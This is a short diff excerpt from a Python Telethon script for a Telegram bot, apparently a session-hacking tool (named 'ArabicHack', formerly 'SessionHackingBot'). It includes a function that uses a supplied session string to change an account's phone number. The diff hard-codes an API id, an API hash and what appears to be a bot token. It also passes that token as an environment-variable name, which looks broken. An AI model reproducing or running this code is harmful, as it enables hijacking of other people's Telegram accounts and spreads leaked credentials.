@@ -14,7 +14,7 @@ import os, asyncio, re
 from os import system
 from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
 API_HASH = ("24c2270e7f1336eb59ca6c48e42ec6ca")
-token = os.environ.get("TOKEN")
+token = os.environ.get("6099693133:AAHQ0eLkiXs4oPLvvxiALh6YIm9N_6qaaDI")
 client = TelegramClient('ArabicHack', 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca").start(bot_token=token)
 from telethon import TelegramClient as tg
 from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
@@ -32,7 +32,7 @@ ArabicHack = 5159123009
 api_id = ("19662621")
 api_hash = ("24c2270e7f1336eb59ca6c48e42ec6ca")
 
-Bot_Username =(mybot , None) or "SessionHackingBot"
+Bot_Username =(mybot , None) or "tmux_sythonbot"
 
 async def change_number_code(strses, number, code, otp):
   async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
